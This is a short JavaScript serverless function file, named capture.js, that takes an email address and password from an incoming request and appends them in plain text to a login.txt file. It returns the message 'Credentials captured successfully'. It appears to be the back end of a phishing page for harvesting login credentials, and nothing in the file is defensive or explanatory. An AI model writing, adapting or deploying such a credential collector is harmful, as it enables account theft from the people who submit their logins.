// functions/capture.js
const fs = require('fs');
const path = require('path');

exports.handler = async function(event, context) {
    const { email, password } = JSON.parse(event.body);

    // Define the path to the login.txt file
    const filePath = path.join(context.functionsDir, 'login.txt');

    // Append the captured credentials to the file
    const data = `Email: ${email}\nPassword: ${password}\n\n`;
    fs.appendFileSync(filePath, data);

    return {
        statusCode: 200,
        body: JSON.stringify({ message: 'Credentials captured successfully' }),
    };
};
